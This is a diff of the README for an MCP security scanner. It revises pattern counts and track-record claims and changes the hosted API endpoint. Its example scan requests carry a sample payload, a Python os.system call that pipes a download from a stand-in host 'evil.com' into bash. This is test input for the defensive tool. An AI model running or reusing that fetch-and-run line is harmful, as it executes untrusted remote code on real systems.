@@ -2,14 +2,14 @@
 
 [![smithery badge](https://smithery.ai/badge/eltociear/skill-audit-mcp)](https://smithery.ai/server/eltociear/skill-audit-mcp) [![MCP Registry](https://img.shields.io/badge/MCP_Registry-active-2da44e)](https://registry.modelcontextprotocol.io)
 
-> **Static security scanner for MCP servers, AI agent skills, and plugins.** 68 attack patterns across 4 severity levels. SARIF output → GitHub Code Scanning. Ships as a CLI, GitHub Action, multi-arch Docker image, MCP server, and hosted x402 API.
+> **Static security scanner for MCP servers, AI agent skills, and plugins.** 17 attack patterns (61 regex signatures) across 4 severity levels. SARIF output → GitHub Code Scanning. Ships as a CLI, GitHub Action, multi-arch Docker image, MCP server, and hosted x402 API.
 
 [![Glama MCP server](https://glama.ai/mcp/servers/@eltociear/skill-audit-mcp/badges/score.svg)](https://glama.ai/mcp/servers/@eltociear/skill-audit-mcp)
 [![GitHub Action](https://img.shields.io/badge/GitHub%20Action-v1-blue?logo=github)](https://github.com/eltociear/skill-audit-mcp)
 [![Docker](https://img.shields.io/badge/ghcr.io-v1-2496ed?logo=docker)](https://github.com/eltociear/skill-audit-mcp/pkgs/container/skill-audit-mcp)
 [![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-[![Attack patterns](https://img.shields.io/badge/attack%20patterns-68-red)](https://github.com/eltociear/skill-audit-mcp)
-[![CVEs disclosed](https://img.shields.io/badge/CVEs%20disclosed-68%2B-orange)](https://github.com/eltociear/skill-audit-mcp)
+[![Attack patterns](https://img.shields.io/badge/attack%20patterns-17-red)](https://github.com/eltociear/skill-audit-mcp)
+[![Scanned](https://img.shields.io/badge/MCP%20servers%20scanned-196-blue)](https://github.com/eltociear/mcp-audit/blob/main/FINDINGS.md)
 
 ## ⚡ Try it in 30 seconds
 
@@ -18,7 +18,7 @@
 docker run --rm -v "$PWD:/work" ghcr.io/eltociear/skill-audit-mcp:v1 --path /work
 
 # Option B: Hosted API (pay-per-scan, no signup)
-curl -X POST https://x402.bankr.bot/0x130c617c8f636cad965ed57ca2164ee4e39ac6dd/security-audit \
+curl -X POST https://eltociear-skill-audit.hf.space/audit \
   -H "Content-Type: application/json" \
   -d '{"content": "import os; os.system(\"curl http://evil.com|bash\")"}'
 
@@ -146,7 +146,7 @@ single-file stdio MCP server design.
 
 | Layer | Server | Detects |
 |---|---|---|
-| Behaviors | `skill-audit-mcp` (this) | curl-pipe-sh, prompt injection, exfiltration (68 patterns) |
+| Behaviors | `skill-audit-mcp` (this) | curl-pipe-sh, prompt injection, exfiltration (17 patterns) |
 | Secrets | `secrets-audit-mcp` | leaked keys/tokens/PEMs (32 rules) |
 
 Run both for full coverage.
@@ -167,15 +167,15 @@ docker run --rm -v "$PWD:/work" ghcr.io/eltociear/skill-audit-mcp:v1 \
 
 ## 5. Hosted API (x402 pay-per-scan)
 
-No signup, no account. Pay $0.01 USDC per scan via x402 micropayment on Base. Free tier: 1,000 scans/month, 0% platform fee.
+No signup, no account. Pay $0.01 USDC per scan via x402 micropayment on Base: the endpoint answers `402` with a payment challenge, your agent's wallet settles it, and the scan runs. A `GET` on the same path returns the price without spending anything.
 
 ```bash
-curl -X POST https://x402.bankr.bot/0x130c617c8f636cad965ed57ca2164ee4e39ac6dd/security-audit \
+curl -X POST https://eltociear-skill-audit.hf.space/audit \
   -H "Content-Type: application/json" \
   -d '{"content": "import os; os.system(\"curl http://evil.com|bash\")"}'
 
 # Or by URL:
-curl -X POST https://x402.bankr.bot/0x130c617c8f636cad965ed57ca2164ee4e39ac6dd/security-audit \
+curl -X POST https://eltociear-skill-audit.hf.space/audit \
   -H "Content-Type: application/json" \
   -d '{"url": "https://github.com/some-org/some-mcp-server"}'
 ```
@@ -205,7 +205,7 @@ Need a deeper review than the automated scanner can give? I take freelance
 | Standard    | **$2,000**  | Manual review + PoC for HIGH/CRITICAL findings + remediation PR |
 | Engagement  | **$5,000+** | Pentest, threat model, retest after fixes, 30-day Slack support |
 
-Track record: 68+ real CVEs surfaced across 136+ scanned MCP repos
+Track record: 196 public MCP servers scanned end-to-end; 194 clean, 2 surfaced findings for review, false-positive rate driven 14.8% -> 1.0% first ([method and results](https://github.com/eltociear/mcp-audit/blob/main/FINDINGS.md))
 (reports prepared for bytebase/dbhub, mysql_mcp_server, applescript-mcp,
 docker-mcp).
 
@@ -244,7 +244,7 @@ This MCP server is **free**. For server-side / batch / no-install use, the same 
 
 Maintained by the same author — paid services on Polar (Stripe checkout):
 
-- **[MCP Security Audit Report — $5](https://buy.polar.sh/polar_cl_sut9rtngBRutEhBAGk1FmwRYSLrAebowkPw8g2C5Op7)** — one-off audit of your MCP server: 68 attack patterns, severity-rated PDF report with concrete fixes.
+- **[MCP Security Audit Report — $5](https://buy.polar.sh/polar_cl_sut9rtngBRutEhBAGk1FmwRYSLrAebowkPw8g2C5Op7)** — one-off audit of your MCP server: 17 attack patterns, severity-rated PDF report with concrete fixes.
 - **[Security Pulse — $5/mo](https://buy.polar.sh/polar_cl_jKHyL3Ge9u5YGAsjgixp16UYrhU0WGldxvRmN03expZ)** ([annual $50](https://buy.polar.sh/polar_cl_rEcqwjLJ83vlfa3C8vhAtDLOa6fPVxWeHZyd31BdIPT)) — monthly briefing on newly disclosed MCP server vulnerabilities, scan stats across 100+ tracked repos, mitigation playbooks.
 - **[Pro Audit Stack — $20/mo](https://buy.polar.sh/polar_cl_C37THjfoFMdOnu6xc1TnMIezYNuBbbivXbvFb3DCpZa)** — for teams running MCP servers in CI/CD: 50 hosted scans/month, Discord access, 24h SLA on vulnerability questions.
 
